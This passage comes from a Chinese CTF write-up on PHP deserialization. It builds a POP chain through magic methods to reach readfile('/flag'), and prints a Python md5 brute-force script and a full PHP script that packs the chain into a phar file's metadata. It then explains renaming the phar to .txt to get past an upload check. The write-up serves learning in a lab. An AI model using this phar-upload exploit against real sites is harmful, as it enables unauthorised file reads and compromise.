class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>3.令 $rocket 为 lets 类来衔接 lets 类中的魔术方法__set()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-comment">//$a为被赋值变量，$b为赋值变量，即上一层级的$k0rian</span><br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br>        <span class="hljs-comment">//未被声明的属性gtg赋值给变量$int_barbituric，联想到go类中的魔术方法__get()</span><br>        <span class="hljs-comment">//go类未声明的属性用于赋值时自动调用魔术方法__get()</span><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>4.令 $ech0 为 go 类来衔接 go 类中的魔术方法__get()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-comment">//当上一层级lets类变量$yolbby等于&quot;666&quot;时</span><br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>            <span class="hljs-comment">//变量$dilvey被作为函数调用，联想到lets类中的魔术方法__invoke()</span><br>            <span class="hljs-comment">//lets类的对象被当做函数调用时自动调用魔术方法__invoke()</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>5.令 $ed_xinhu 为 lets 类来衔接 lets 类中的魔术方法__invoke()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>        <span class="hljs-comment">//创建参数为$errmis的notes类新对象，自动调用notes类魔术方法__construct()</span><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>6.令 $errmis 为’&#x2F;flag’：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-comment">//参数传递给$filepath即执行readfile(&#x27;/flag&#x27;)</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>7.综上构造链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ray</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">_0rays</span>();<br><span class="hljs-variable">$ray</span>-&gt;jbn = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-variable">$lets</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$lets</span>-&gt;mak4r1=<span class="hljs-string">&#x27;asc&#x27;</span>;<br><span class="hljs-comment">//$mak4r1--&gt;用md5加密--&gt;取倒数2~4位--&gt;$yolbby</span><br><span class="hljs-comment">//写个python脚本枚举出一个md5加密后密文满足&#x27;666&#x27;条件的字符串即可</span><br><span class="hljs-variable">$new_lets1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu-&gt;errmis=<span class="hljs-string">&#x27;/flag&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>-&gt;ech0=<span class="hljs-variable">$go</span>;<br><span class="hljs-variable">$lets</span>-&gt;rocket=<span class="hljs-variable">$new_lets1</span>;<br><span class="hljs-variable">$ray</span>-&gt;pankas=<span class="hljs-variable">$lets</span>;<br></code></pre></td></tr></table></figure><p>枚举用的 python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">input_string</span>):<br>    md5_hash = hashlib.md5()<br>    md5_hash.update(input_string.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5_hash.hexdigest()<br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    input_string = <span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))+<span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))+<span class="hljs-built_in">chr</span>(randint(<span class="hljs-number">97</span>,<span class="hljs-number">122</span>))<br>    <span class="hljs-keyword">if</span> md5_hash(input_string)[-<span class="hljs-number">4</span>:-<span class="hljs-number">1</span>]== <span class="hljs-string">&quot;666&quot;</span>:<br>        <span class="hljs-built_in">print</span>(input_string)<br>        <span class="hljs-built_in">print</span>(md5_hash(input_string))<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>各对象变量的结构图</p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93/1.png"></p><h4 id="3-生成-phar-文件，上传并触发反序列化"><a href="#3-生成-phar-文件，上传并触发反序列化" class="headerlink" title="3.生成 phar 文件，上传并触发反序列化"></a>3.生成 phar 文件，上传并触发反序列化</h4><p>结合上面写好的在本地跑出 phar 文件并测试正确性，可以用小皮看一下效果，也可以 vscode 上配一下环境调试一下看看，加深反序列化攻击过程的理解。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// easy unserialize chain OuO</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">notes</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filepath</span></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filepath</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// flag in /flag , let&#x27;s go !!</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_0rays</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jbn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pankas</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span> -&gt; jbn))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable language_">$this</span> -&gt; pankas);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ha?&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lets</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$yolbby</span> = <span class="hljs-string">&quot;nonono&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mak4r1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ech0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rocket</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errmis</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$humb1e</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span> -&gt; mak4r1);<br>        <span class="hljs-variable">$k0rian</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$humb1e</span>,-<span class="hljs-number">4</span>,-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable language_">$this</span> -&gt; rocket -&gt; dbg = <span class="hljs-variable">$k0rian</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;O.o?&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-variable">$yolbby</span> = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable">$int_barbituric</span> = <span class="hljs-variable language_">$this</span> -&gt; ech0 -&gt; gtg;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$this</span> -&gt; errmis);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">go</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ed_xinhu</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(lets::<span class="hljs-variable">$yolbby</span> === <span class="hljs-string">&quot;666&quot;</span>)&#123;<br>            <span class="hljs-variable">$dilvey</span> = <span class="hljs-variable language_">$this</span> -&gt; ed_xinhu;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$dilvey</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to win !&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$filePath</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filePath</span>))&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$realPath</span> = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$filePath</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$realPath</span>, <span class="hljs-string">&#x27;/notes&#x27;</span>) === <span class="hljs-number">0</span> ) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listnote</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$directory</span> = <span class="hljs-string">&#x27;/notes&#x27;</span>; <br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$directory</span>), function (<span class="hljs-variable">$file</span>) <span class="hljs-keyword">use</span> ($<span class="hljs-title">directory</span>) &#123;<br>        <span class="hljs-title">return</span> <span class="hljs-title">is_file</span>(&quot;$<span class="hljs-title">directory</span>/$<span class="hljs-title">file</span>&quot;);<br>    &#125;);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>        <span class="hljs-variable">$link</span> = <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=/notes/&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$f</span>) . <span class="hljs-string">&#x27;&lt;/a&gt; &lt;p&gt;&lt;/p&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$link</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;/index.php?note=show-me-source&quot;&gt;show source&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// upload your own note ? (under development)</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;user_note&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> &amp;&amp; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION)) === <span class="hljs-string">&#x27;txt&#x27;</span>) &#123;<br>        <span class="hljs-variable">$randomFileName</span> = <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>        <span class="hljs-variable">$targetFilePath</span> = <span class="hljs-string">&quot;/notes/&quot;</span> . <span class="hljs-variable">$randomFileName</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$targetFilePath</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your note successfully saved in :&quot;</span>.<span class="hljs-variable">$targetFilePath</span>;<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);   <br>&#125;<br><br><span class="hljs-variable">$note</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;note&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$note</span> === <span class="hljs-string">&quot;show-me-source&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$note</span>))&#123;<br>            <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/plain; charset=UTF-8&#x27;</span>);<br>            <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">notes</span>(<span class="hljs-variable">$note</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;这里是mak自己悄悄留给你的一些笔记哦，打开看看吧&lt;/h1&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;Notes List:&lt;h2&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">listnote</span>();<br>&#125;<br><br><span class="hljs-comment">//前面写好的链子</span><br><span class="hljs-variable">$ray</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">_0rays</span>();<br><span class="hljs-variable">$ray</span>-&gt;jbn = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br><span class="hljs-variable">$lets</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$lets</span>-&gt;mak4r1=<span class="hljs-string">&#x27;asc&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">go</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lets</span>();<br><span class="hljs-variable">$go</span>-&gt;ed_xinhu-&gt;errmis=<span class="hljs-string">&#x27;/flag&#x27;</span>;<br><span class="hljs-variable">$new_lets1</span>-&gt;ech0=<span class="hljs-variable">$go</span>;<br><span class="hljs-variable">$lets</span>-&gt;rocket=<span class="hljs-variable">$new_lets1</span>;<br><span class="hljs-variable">$ray</span>-&gt;pankas=<span class="hljs-variable">$lets</span>;<br><br><span class="hljs-comment">//生成phar文件</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);    <span class="hljs-comment">//删除之前的phar.phar文件(如果有)</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();            <span class="hljs-comment">//开始写文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);    <span class="hljs-comment">//写入stu头部信息</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$ray</span>);    <span class="hljs-comment">//重点！！将构造好的链子写入meta-data也就是manifest字段，这里会自动进行序列化，因此传入链头就行。其实可以理解为serialize（$o）;</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;phar.txt&quot;</span>, <span class="hljs-string">&quot;phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-comment">//本地测试</span><br><span class="hljs-comment">//$serialized = serialize($ray);//在本地序列化观察一下序列化的结果</span><br><span class="hljs-comment">//echo $serialized;</span><br><span class="hljs-comment">//unserialize($serialized);//可以在本地测试一下是否成功</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先根据源码文件上传部分的限制，修改 phar 文件的后缀变为 txt，然后用 python 发送文件到靶机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 